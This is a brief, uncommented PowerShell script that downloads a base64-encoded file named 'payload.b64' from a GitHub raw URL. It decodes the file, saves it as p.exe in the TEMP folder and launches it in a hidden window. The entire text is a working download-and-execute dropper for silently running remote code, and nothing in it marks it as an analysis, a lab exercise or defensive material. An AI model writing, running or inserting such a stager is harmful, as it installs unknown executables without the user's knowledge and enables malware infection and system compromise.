$payloadUrl = "https://raw.githubusercontent.com/jimboslimuser/p/main/payload.b64"
$b = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($payloadUrl))
$outPath = "$env:TEMP\p.exe"
if (Test-Path $outPath) { Remove-Item $outPath -Force }
[IO.File]::WriteAllBytes($outPath, $b)
$wshell = New-Object -ComObject WScript.Shell
$wshell.Run("cmd /c start """" `"$outPath`"", 0, $false)